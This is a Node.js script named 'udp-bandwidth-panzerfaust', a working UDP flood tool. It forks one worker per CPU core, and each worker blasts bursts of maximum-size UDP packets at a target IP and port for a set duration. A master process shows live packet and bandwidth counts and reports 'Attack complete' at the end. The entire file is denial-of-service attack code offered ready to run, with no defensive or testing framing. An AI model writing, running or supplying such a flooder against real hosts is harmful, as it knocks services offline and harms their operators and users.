const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-bandwidth-panzerfaust.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const cpuCount = os.cpus().length;

const MAX_UDP_PAYLOAD = 65507; // Max UDP payload size in bytes
const SAFE_CPU_THRESHOLD = 90; // CPU % threshold to throttle
const SAFE_MEM_THRESHOLD = 85; // RAM % threshold to throttle

// Create two max-sized payload buffers (simulate 2x max chunk)
const payload1 = Buffer.alloc(MAX_UDP_PAYLOAD, 'A');
const payload2 = Buffer.alloc(MAX_UDP_PAYLOAD, 'B');

function getCpuUsage() {
  const cpus = os.cpus();
  let idle = 0, total = 0;
  cpus.forEach(cpu => {
    for (let type in cpu.times) total += cpu.times[type];
    idle += cpu.times.idle;
  });
  return { idle: idle / cpus.length, total: total / cpus.length };
}

if (cluster.isMaster) {
  let totalSent = 0;
  let totalBytesSent = 0;
  let maxBPS = 0;

  console.clear();
  console.log('UDP-BANDWIDTH-PANZERFAUST [2x MAX PAYLOAD + AUTO-SCALE]');
  console.log('------------------------------------------------------');
  console.log(`Target: ${target}:${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`CPU Cores: ${cpuCount}`);
  console.log('Launching...\n');

  let cpuStart = getCpuUsage();

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  const statsPerWorker = new Array(cpuCount).fill({bps:0, sent:0});

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        statsPerWorker[id - 1] = {bps: msg.bps, sent: msg.sent, bytes: msg.bytes};
        totalSent += msg.sent;
        totalBytesSent += msg.bytes;
        if (msg.bps > maxBPS) maxBPS = msg.bps;
      }
    });
  }

  function avg(arr, key) {
    return arr.reduce((a, b) => a + (b[key]||0), 0) / arr.length;
  }

  setInterval(() => {
    const cpuEnd = getCpuUsage();
    const idleDiff = cpuEnd.idle - cpuStart.idle;
    const totalDiff = cpuEnd.total - cpuStart.total;
    const cpuUsage = 100 - Math.floor((idleDiff / totalDiff) * 100);
    cpuStart = cpuEnd;

    console.clear();
    console.log('UDP-BANDWIDTH-PANZERFAUST [2x MAX PAYLOAD + AUTO-SCALE]');
    console.log('------------------------------------------------------');
    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
    console.log(`Total Bandwidth Sent: ${(totalBytesSent/1024/1024).toFixed(2)} MB`);
    console.log(`Max BPS (bytes/sec): ${(maxBPS).toLocaleString()}`);
    console.log(`CPU Usage: ${cpuUsage}%`);
    console.log(`Target: ${target}:${port}`);
    console.log('------------------------------------------------------');

    maxBPS = 0;
  }, 2000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const sock = dgram.createSocket('udp4');
  let sent = 0;
  let bytesSent = 0;
  let bps = 0;
  let isThrottled = false;

  function getMemoryUsagePercent() {
    const mem = process.memoryUsage();
    const usedMB = mem.rss / 1024 / 1024;
    const totalMB = os.totalmem() / 1024 / 1024;
    return (usedMB / totalMB) * 100;
  }

  function spam() {
    function sendLoop() {
      if (Date.now() > endTime) return;

      if (!isThrottled) {
        // Send 2 max packets per iteration
        for (let i = 0; i < 1000; i++) { // burst size 1000 iterations * 2 packets = 2000 packets
          sock.send(payload1, port, target, () => {});
          sock.send(payload2, port, target, () => {});
          sent += 2;
          bytesSent += payload1.length + payload2.length;
          bps += payload1.length + payload2.length;
        }
        setImmediate(sendLoop);
      } else {
        setTimeout(() => {
          isThrottled = false;
          sendLoop();
        }, 10000);
      }
    }
    sendLoop();
  }

  setInterval(() => {
    const memUsage = getMemoryUsagePercent();
    if (!isThrottled && memUsage > SAFE_MEM_THRESHOLD) {
      isThrottled = true;
    }
  }, 500);

  setInterval(() => {
    process.send({ type: 'stats', sent, bps, bytes: bytesSent });
    sent = 0;
    bps = 0;
  }, 1000);

  spam();
}
